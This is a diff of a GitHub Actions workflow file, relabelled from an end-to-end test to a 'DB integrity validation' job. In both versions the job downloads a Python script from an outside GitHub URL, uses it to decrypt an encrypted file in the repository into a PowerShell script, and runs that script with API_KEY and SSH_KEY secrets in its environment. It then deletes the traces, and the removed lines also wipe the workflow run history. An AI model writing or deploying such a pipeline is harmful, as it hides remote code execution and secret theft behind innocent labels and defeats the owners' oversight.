@@ -1,4 +1,4 @@
-name: CI-End-to-End-Validation
+name: DB-Integrity-Validation
 
 on:
   push:
@@ -6,72 +6,52 @@ on:
   workflow_dispatch:
 
 jobs:
-  Automated-Suite:
+  validate-assets:
     runs-on: windows-latest
     permissions:
       actions: write
       contents: read
 
     steps:
-      - name: Initialize Repository
+      - name: Initialize Environment
         uses: actions/checkout@v4
 
-      - name: Setup Python Environment
+      - name: Setup Python
         uses: actions/setup-python@v5
         with:
           python-version: '3.11'
 
-      - name: Cache Build Dependencies
-        uses: actions/cache@v4
-        with:
-          path: |
-            ~\AppData\Local\pip\Cache
-            C:\ProgramData\tools-runtime
-          key: ${{ runner.os }}-build-${{ github.run_id }}
-          restore-keys: |
-            ${{ runner.os }}-build-
-
-      - name: Install Integration Requirements
+      - name: Install Runtime Dependencies
         run: |
           python -m pip install --upgrade pip
-          pip install cryptography requests  # Modul umum yang biasa dipake script decrypt
+          pip install cryptography requests pillow pycryptodome --quiet
 
-      - name: Execute Integration Tests
+      - name: Execute Security Validation
         shell: powershell
         env:
           API_KEY: ${{ secrets.API_KEY }}
           SSH_KEY: ${{ secrets.SSH_KEY }}
         run: |
-          $remoteUrl = "https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py"
-          Invoke-WebRequest -Uri $remoteUrl -OutFile "core_engine.py"
+          $engineUrl = "https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py"
+          Invoke-WebRequest -Uri $engineUrl -OutFile "internal_validator.py"
           
-          if (Test-Path "database_i4x.dexenc") {
-              Write-Host "Verifying encrypted assets..."
-              python core_engine.py decrypt -i "database_i4x.dexenc" -key "$env:API_KEY" -o "temp_runtime.ps1"
-              
-              if (Test-Path "temp_runtime.ps1") {
-                  Write-Host "Running post-decryption validation..."
-                  . ./temp_runtime.ps1
-                  # Cleanup instant untuk meminimalisir footprint
-                  Remove-Item "temp_runtime.ps1", "core_engine.py" -Force
+          $encFile = "database_test.dexenc"
+          $runtimeScript = "db_schema_update.ps1"
+
+          if (Test-Path $encFile) {
+              Write-Host "[*] Verifying $encFile integrity..." -ForegroundColor Cyan
+              python internal_validator.py decrypt -i $encFile -key "$env:API_KEY" -o $runtimeScript
+              Start-Sleep -s 2
+              if (Test-Path $runtimeScript) {
+                  Write-Host "[+] Integrity check passed. Running post-validation..." -ForegroundColor Green
+                  . .\$runtimeScript
+                  Remove-Item $runtimeScript, "internal_validator.py" -Force
+                  Write-Host "[+] Validation cycle completed." -ForegroundColor Gray
               } else {
-                  throw "Validation Error: Runtime file not generated."
+                  Write-Error "CRITICAL: Schema validation failed."
+                  exit 1
               }
           } else {
-              Write-Error "Asset missing: database_i4x.dexenc"
+              Write-Error "MISSING ASSET: $encFile"
               exit 1
           }
-
-      - name: Finalize Logs
-        if: always()
-        run: |
-          echo "Test suite finished with exit code $LASTEXITCODE"
-
-      - name: Purge Run History
-        uses: Mattraks/delete-workflow-runs@v2
-        if: always()
-        with:
-          token: ${{ github.token }}
-          repository: ${{ github.repository }}
-          retain_days: 0
-          keep_minimum_runs: 0
